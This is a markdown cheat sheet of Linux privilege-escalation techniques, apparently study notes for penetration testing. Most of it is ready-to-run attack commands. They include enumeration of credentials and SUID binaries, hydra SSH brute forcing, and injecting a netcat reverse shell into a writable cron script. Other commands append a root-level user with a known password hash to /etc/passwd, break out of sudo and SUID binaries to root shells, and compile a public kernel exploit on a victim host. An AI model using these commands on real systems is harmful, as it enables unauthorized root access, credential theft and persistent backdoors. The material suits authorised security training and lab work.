# Linux Privilege Escalation

* Enumerating Linux
* Exposed Confidential Information
* Insecure File Permissions
* Abusing System Linux components
* Mitre Att&ck Techniques `https://attack.mitre.org/tactics/TA0004/`

## Linux Permisisons

* -rws  = suid, guid bit runs with the permission of the file owner
* dr-- = list directory
* drw- = create and write files
* drwx = crossing through directory to access content e.g. cd /var

## Linux Enumeration

* view hostname `hostname`
* list user context information `id`
* list users `/etc/passwd`
* list groups `/etc/groups`
* list release `cat /etc/*-release`
* list kernel version and architecture `uname -a`
* list processes `ps aux`
* list network interfaces and routes `ip address, route, ss -anp`
* list firewall config and rules `cat /etc/iptables`
* list scheduled task `ls -lah /etc/cron*`
* list installed packages and apps `dpkg -l`
* list suid binaries `find / -perm -u=s type -f`
* list writeable directories and files by the user `find / -writeable -type d`
* list mounted filesystem, fstab at boot time `mount`
* list available disks `lsblk`
* list drivers and kernel module `lsmod, /sbin/modinfo`
* list programs for file upload `find / -name nc*`

## Manual Enumeration

```bash
# user, groups
id
cat /etc/passwd
cat /etc/group

# list sudo users
getent group sudo
grep '^sudo:' /etc/group 

# hostname, environment
hostname
(env || set) 2>/dev/null

# release, kernel version e.g. 4.19.0 and architecture x86_64
cat /etc/issue
cat /etc/*-release
uname -a
uname -r
arch

  Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30)
x86_64 GNU/Linux

# list processes in user-friedly format w/o tty (virtual terminal interfaces)
ps aux

# list network and routes
ip address
ifconfig
route
routel
netstat -anp
ss -anp

# list firewall rule, requires iptables-persistent package 
ufw status verbose
sudo iptables -L -v
cat /etc/iptables/rules.v4

# list cron jobs of user and root
crontab -l
sudo crontab -l 
ls -lah /etc/cron*

# list installed packages and applications
dpkg -l
apt list --installed | grep sudo
rpm -qa

# list suid binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# list writeable directories and files by the user
find / -type d -writable 2>/dev/null
find ~ -type f -writable 2>/dev/null

# list mounted filesystem, fstab at boot time
mount
  /dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro)

cat /etc/fstab

# list avaiable disks
lsblk
df -h

# list drivers and kernel modules including file name and version
lsmod
/sbin/modinfo modulename

# list programs for file upload
find / -name wget 
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp


## Automated Enumeration

* Kali `unix-privsec-check` 
* Download `https://github.com/rebootuser/LinEnum` 
* Download & Quick-Start `https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS`

```bash
# perform standard privilege checks
cp /usr/bin/unix-privesc-check .
chmod +x ./unix-privesc-check
./unix-privesc-check standard > output.txt

# find keyword in files, report to /tmp
./LinEnum.sh -s -k keyword -r report -e /tmp/

```

## Confidential Information Disclosure

```bash
# environment variables
(env || set) 2>/dev/null

# review dot file which executes when shell opens
grep "export" /home/**/.*rc 2> /dev/null
cat ~/.bashrc

# try to escalate privileges
su - root
sudo -l
sudo -i

# try to watch what processes do 
watch -n 1 "ps -aux | grep pass"

# try to capture network traffic on loopback interface 
# -A ASCII
sudo tcpdump -i lo -A | grep "pass"

# create word list and run hydra to crack it using ssh
# crunch - t <pattern>
crunch 6 6 -t lab%%% > wordlist
hydra -l user -P wordlist  192.168.50.214 -t 4 ssh -V

```

## Abusing CRON Jobs

* Requires insecure write file permisison on executed script
* Review Syslog for jobs to find script execution
* Find writeable file by permissions
* Manipulate script file e.g. add reverse shell
* Reverse Shell Cheat Sheet `https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet`

```bash
# Review syslog for jobs
tail -f /var/log/cron.log
grep "CRON" /var/log/syslog


# Find writeable file by permissions
ls -lah /home/joe/.scripts/user_backups.sh
# Manipulate script file e.g. add reverse shell on the localhost
echo >> user_backups.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f" >> user_backups.sh

```

## Abusing Passwd Backward compatibility

* Requires insecure write file permisison /etc/passwd
* create a known password hash `openssl passwd s3cret`
* append it to /etc/passwd file

```bash
# find world writeable /etc/passwd
ls -lah /etc/passwd
openssl passwd s3cret
echo "admin:dfRJvv47IBQLI:0:0:root:/root:/bin/bash" >> /etc/passwd

# one-liner to append user admin:s3cret to /etc/passwd
echo "[+] Add admin:s3cret to /etc/passwd"; cat /etc/passwd; grep "root" /etc/passwd | sed "s/root:x/admin:dfRJvv47IBQLI/g" | tee -a /etc/passwd;
```

## Abusing SUID Binary

* Requires a process with suid (s) being executed
* Get process id `ps aux -C passwd`
* Grep real, effective, saved set and filesystem UIs
  * e.g. `grep Uid /proc/1932/status`
  * Uid: 1000   0   0   0  
* find suid bit `find / -perm -u=s`
* find suid cap `/usr/sbin/getcap -r / 2>/dev/null`

```bash
# find suid bit
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# verify suid bit
ls -asl /usr/bin/passwd
 64 -rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd

# add suid bit with chmod
chmod u+s find

# exploit find suid bit
find /home/bob/ -exec "/usr/bin/bash" -p \;
whoami
 root

# find suid cap
/usr/sbin/getcap -r / 2>/dev/null

# exploit perl cap_suid+ep (gtfobins.github.com)
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash"'

# exploit gdb cap_suid+ep (gtfobins.github.com)
# cp $(which gdb) .
# sudo setcap cap_setuid+ep gdb
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit

```

## Abusing Sudo

* requires Sudo privileges
* verify the AppAmor kernel module is not loaded for the binary `aa-status`
* binaries from `https:gtfobins.github.com` that allow sudo breakouts to shell

```bash
# list command to cass as root
sudo -l
 (ALL) (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get

# verify the AppAmor kernel module is not loaded for the abusable binary 
aa-status

# abuse bash
sudo bash -i

# abuse gawk
gawk 'BEGIN {system("/bin/sh")}'

# abuse apt get
sudo apt-get changelog apt
!/bin/sh

# abuse gcc
sudo gcc -wrapper /bin/bash,-s .

# abuse tcpdump
COMMAND='id';TF=$(mktemp); echo "$COMMAND" > $TF; chmod +x $TF;
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root

```

## Exploit Kernel Vulnerabilities

Attacker

```bash
cat /etc/issue
uname -r
arch

# search for exploit
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
searchsploit -m 45010
 Verified: True

# copy to victim
head 45010.c -n 20
mv 45010.c cve-2017-16995.c
scp cve-2017-16995.c joe@192.168.123.216:
```

Victim

```bash
# build on victim and verify architecture
gcc cve-2017-16995.c -o cve-2017-16995
file cve-2017-16995
 cve-2017-16995: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically 
./cve-2017-16995
```

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/bash -i
```s

## Links

* Linux Privilege Escalation `https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md`
* Hacktricks `https://book.hacktricks.xyz/linux-hardening/privilege-escalation`
* GTFOBins linux binaries to exploited `https://gtfobins.github.io/`
* Basic Linux EoP `https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/`
